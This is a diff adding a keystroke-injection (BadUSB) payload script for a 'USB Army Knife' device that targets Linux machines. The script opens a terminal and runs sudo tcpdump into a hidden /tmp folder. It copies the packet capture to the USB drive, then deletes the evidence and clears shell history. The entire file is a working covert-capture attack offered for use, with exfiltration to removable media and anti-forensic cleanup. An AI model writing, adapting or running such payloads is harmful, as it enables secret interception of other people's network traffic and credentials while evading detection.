@@ -1,0 +1,47 @@
+# ============================================
+# LINUX NETWORK SNIFF - USB Ethernet
+# ============================================
+# Purpose: Capture network traffic
+# Requires: USB Army Knife with network interface
+# Time: 60 seconds (or continuous)
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+CTRL ALT T
+DELAY 1000
+
+STRING mkdir -p /tmp/.pcap
+ENTER
+DELAY 100
+
+# Find USB network interface
+STRING IFACE=$(ip link show | grep -B1 "state DOWN" | head -1 | awk '{print $2}' | tr -d ':')
+ENTER
+DELAY 200
+
+# Start capture
+STRING sudo tcpdump -i $IFACE -w /tmp/.pcap/capture.pcap -c 10000 &
+ENTER
+DELAY 100
+
+# Alternative: Use USB gadget interface
+STRING # sudo ifconfig usb0 up 2>/dev/null
+ENTER
+DELAY 100
+
+# Wait for capture
+STRING sleep 60
+ENTER
+DELAY 60000
+
+# Copy to USB
+STRING cp /tmp/.pcap/capture.pcap /media/usb/ 2>/dev/null
+ENTER
+DELAY 500
+
+STRING rm -rf /tmp/.pcap
+ENTER
+STRING history -c; clear
+ENTER
